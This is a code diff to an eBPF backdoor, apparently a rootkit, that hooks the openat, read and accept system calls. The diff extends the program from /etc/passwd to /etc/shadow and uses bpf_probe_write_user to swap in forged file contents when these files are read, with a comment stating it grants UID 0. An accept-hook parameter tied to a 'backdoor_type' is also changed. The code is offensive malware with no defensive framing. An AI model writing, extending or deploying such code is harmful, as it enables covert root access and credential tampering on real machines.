@@ -16,6 +16,7 @@
 
 #define AUTHORIZED_KEYS 1
 #define PASSWD 2
+#define SHADOW 3
 
 #define filename_len_max 128
 
@@ -103,6 +104,19 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
     }
     if (is_passwd == 1) {
         file_type = PASSWD;
+    }
+
+    int is_shadow = 1;
+    /* shadow */
+    const char shadow[] = "/etc/shadow";
+    for (int i = 0; i < 11; i++) {
+        if (shadow[i] != check_filename[i]) {
+            is_shadow = 0;
+            break;
+        }
+    }
+    if (is_shadow == 1) {
+        file_type = SHADOW;
     }
 
     int is_auth_key = 0;
@@ -334,16 +348,23 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
         }
     }
 
-    if (file_type == PASSWD)
+    // We are giving UID 0 no matter what's the backdoor type
+    if (file_type == PASSWD || file_type == SHADOW)
     {
-        struct passwd_block *passwd = bpf_map_lookup_elem(&passwd_elem, &zero);
-        if (passwd == 0) {
+        int one = 1;
+        struct file_block *file;
+        if (file_type == PASSWD) {
+            file = bpf_map_lookup_elem(&files_elem, &zero);
+        } else {
+            file = bpf_map_lookup_elem(&files_elem, &one);
+        }
+
+        if (file == 0) {
             return 0; // You should not be here
         }
-        unsigned int passwd_len = passwd->buff_len;
-        if (ctx->ret > 0 && ctx->ret <= sizeof(passwd->buff)) {
-            bpf_probe_write_user((void*)e->buff, (void*) passwd->buff, ctx->ret);
-            // bpf_printk("OVERWRITTEN PASSWD");
+        if (ctx->ret > 0 && ctx->ret <= sizeof(file->buff)) {
+            // bpf_printk("OVERWRITTEN PASSWD/SHADOW");
+            bpf_probe_write_user((void*)e->buff, (void*) file->buff, ctx->ret);
         }
     }
 
@@ -371,7 +392,7 @@ int accept_entrypoint(struct trace_event_raw_sys_enter *ctx)
     struct sockaddr_in * addr = (struct sockaddr_in *)ctx->args[1];
     struct accept_args args = {
         .addr = addr,
-        .ttl = 5, // doing a little hack
+        .ttl = 10, // doing a little hack
         .backdoor_type = 0
     };
     const int key = 0;
